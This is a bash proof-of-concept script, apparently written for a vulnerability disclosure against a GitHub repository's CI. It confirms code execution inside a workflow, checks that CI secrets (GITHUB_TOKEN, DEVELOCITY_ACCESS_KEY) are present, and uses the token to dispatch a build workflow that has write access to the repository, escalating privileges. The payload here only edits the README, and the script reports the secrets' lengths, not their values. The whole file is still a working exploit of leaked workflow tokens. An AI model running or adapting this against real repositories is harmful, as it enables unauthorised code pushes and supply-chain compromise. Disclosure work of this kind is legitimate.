#!/bin/bash
echo "========================================="
echo "  CRITICAL: Privilege Escalation PoC"
echo "  Attacker: treborlab"
echo "  Target: robertprast/beam"
echo "  Time: $(date -u)"
echo "========================================="
echo ""
echo "=== Step 1: Code Execution Confirmed ==="
echo "Running on: $(uname -a)"
echo "User: $(whoami)"
echo ""
echo "=== Step 2: Secrets Available ==="
echo "DEVELOCITY_ACCESS_KEY length: ${#DEVELOCITY_ACCESS_KEY}"
echo "GITHUB_TOKEN length: ${#GITHUB_TOKEN}"
echo ""
echo "=== Step 3: GITHUB_TOKEN Permissions ==="
# Check what permissions the token has
curl -s -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/repos/$GITHUB_REPOSITORY | jq '{permissions}' 2>/dev/null || echo "Could not check permissions"
echo ""
echo "=== Step 4: Dispatching build_wheels.yml via actions:write ==="
# Get the workflow ID for build_wheels.yml
BUILD_WF_ID=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows" | \
  jq '.workflows[] | select(.name == "Build python wheels") | .id')

echo "build_wheels workflow ID: $BUILD_WF_ID"

if [ -n "$BUILD_WF_ID" ] && [ "$BUILD_WF_ID" != "null" ]; then
  # Dispatch the workflow - this runs with contents:write!
  DISPATCH_RESULT=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Authorization: token $GITHUB_TOKEN" \
    -H "Accept: application/vnd.github.v3+json" \
    "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows/$BUILD_WF_ID/dispatches" \
    -d '{"ref":"master"}')
  
  HTTP_CODE=$(echo "$DISPATCH_RESULT" | tail -1)
  echo "Dispatch HTTP status: $HTTP_CODE"
  
  if [ "$HTTP_CODE" = "204" ]; then
    echo "=== ESCALATION SUCCESSFUL ==="
    echo "build_wheels.yml dispatched with contents:write"
    echo "It will push 'hi from trebor' to README.md on master"
  else
    echo "Dispatch response: $(echo "$DISPATCH_RESULT" | head -1)"
  fi
else
  echo "Could not find build_wheels workflow"
fi

echo ""
echo "=== PoC Complete ==="
